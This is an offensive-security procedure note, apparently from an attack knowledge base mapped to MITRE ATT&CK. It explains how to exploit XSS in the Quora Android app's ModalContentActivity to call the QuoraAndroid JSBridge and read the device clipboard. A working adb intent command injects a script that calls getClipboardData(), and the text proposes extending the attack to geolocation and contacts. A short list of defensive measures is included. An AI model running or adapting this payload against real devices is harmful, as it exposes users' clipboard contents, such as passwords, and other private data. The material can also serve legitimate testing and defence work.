---
tags:
  - xss
  - jsbridge
  - data-exfiltration
type: procedure
tools:
  - '[[tools/ADB]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/am-start-modal-jsbridge-clipboard]]'
platforms:
  - Android
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: aa05d622-e29f-40b3-9266-dfb266cfa316
created_at: '2025-12-13T23:52:44.062Z'
updated_at: '2025-12-13T23:52:44.062Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Access-Quora-JSBridge-to-Read-Clipboard-Data-via-XSS

## Summary

This procedure uses XSS in ModalContentActivity to invoke the QuoraAndroid JSBridge API, reading and alerting clipboard data to demonstrate sensitive information access within the app's trusted context.

## Description

The JSBridge exposes native APIs to JavaScript in the WebView. Via XSS, call QuoraAndroid.getClipboardData() to steal clipboard contents (e.g., passwords). Requires prior XSS confirmation; outcomes include data exposure, extendable to other JSBridge methods like geolocation or contacts.

## Requirements

1. Vulnerable Quora app on ADB-accessible device
2. Clipboard containing test data on device
3. ADB shell for intent launch

## Defense

Defensive measures and detection strategies:

- Remove or restrict JSBridge addJavascriptInterface on Android >4.2
- Validate JSBridge calls with origin checks
- Monitor WebView JavaScript errors and unexpected API invocations in logs

## Objectives

1. Access native APIs via WebView XSS
2. Exfiltrate user data like clipboard
3. Highlight privilege escalation risks

## Instructions

### Step 1: Launch ModalContentActivity with JSBridge Payload

**Context**: Inject script to call getClipboardData and display via alert.

**Command** ([[commands/am-start-modal-jsbridge-clipboard]]):
```bash
am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipboardData());</script>'
```

> Expected output: Modal launches, script runs, alert shows clipboard text.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/am-start-modal-jsbridge-clipboard]]

## Tools Used

- [[tools/ADB]]

## Tags

- jsbridge
- data-exfiltration
- xss
